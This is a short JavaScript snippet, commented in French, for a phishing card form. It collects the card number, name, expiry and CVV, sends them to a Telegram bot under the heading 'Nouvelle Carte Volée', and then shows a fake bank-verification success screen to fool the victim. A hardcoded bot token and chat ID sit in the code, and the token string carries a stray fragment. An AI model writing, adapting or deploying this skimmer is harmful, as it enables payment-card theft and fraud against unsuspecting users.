document.getElementById('cardForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // 1. Récupération des valeurs
    const cardNumber = document.getElementById('cardNumber').value;
    const cardName = document.getElementById('cardName').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // 2. Affichage du chargement
    document.querySelector('button').style.display = 'none';
    document.getElementById('loader').style.display = 'block';

    // 3. Préparation du message pour Telegram
    const message = `🔔 *Nouvelle Carte Volée*\n\n` +
                    `👤 Nom: ${cardName}\n` +
                    `💳 N° Carte: ${cardNumber}\n` +
                    `📅 Exp: ${expiry}\n` +
                    `🔑 CVV: ${cvv}\n` +
                    `📱 Appareil: iPhone (iOS)`;

    // 4. Envoi via l'API Telegram (Fetch)
    const botToken = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ/getUpdates
';
    const chatId = '8501464548';
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (response.ok) {
            // Succès : On change l'interface pour simuler une validation bancaire
            document.querySelector('.container').innerHTML = `
                <div style="text-align:center; padding:20px;">
                    <div style="font-size:50px; margin-bottom:10px;">✅</div>
                    <h2 style="color:#34C759;">Opération Réussie</h2>
                    <p style="color:#8E8E93;">Votre carte a été vérifiée avec succès.</p>
                </div>
            `;
        } else {
            console.error("Erreur envoi Telegram");
            alert("Erreur de connexion.");
        }
    } catch (error) {
        console.error("Erreur réseau", error);
    }
});
